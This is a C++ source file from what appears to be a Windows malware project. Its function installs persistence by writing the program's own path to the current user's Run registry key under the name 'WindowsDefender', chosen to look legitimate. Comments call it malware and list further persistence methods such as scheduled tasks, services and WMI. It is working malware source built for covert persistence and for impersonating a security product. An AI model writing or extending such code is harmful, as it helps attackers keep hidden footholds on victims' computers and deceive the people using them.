#include "persistence.h"
#include "globals.h"
#include <windows.h>
#include <string>
#include <iostream>

using namespace std;

// Install persistence mechanism (completely rewritten)
bool install_persistence() {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    string exePath(currentPath);
    
    if (g_debug_mode) {
        cout << "Setting up persistence for: " << exePath << endl;
        cout.flush();
    }

    // Primary method: Run key in registry
    bool success = false;
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                    0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        // Use a generic name that looks legitimate
        RegSetValueExA(hKey, "WindowsDefender", 0, REG_SZ, 
                     (BYTE*)exePath.c_str(), exePath.length() + 1);
        RegCloseKey(hKey);
        
        if (g_debug_mode) {
            cout << "Registry persistence installed." << endl;
            cout.flush();
        }
        success = true;
    }
    
    // Secondary persistence method: Scheduled Task
    if (g_debug_mode) {
        cout << "Adding additional persistence mechanisms..." << endl;
        cout.flush();
    }
    
    // This is just a placeholder - in a real malware, additional persistence methods
    // would be implemented here, such as scheduled tasks, services, WMI, etc.
    
    return success;
}

// DO NOT add delete_original_file or any similar function here
// That functionality is now in utils.cpp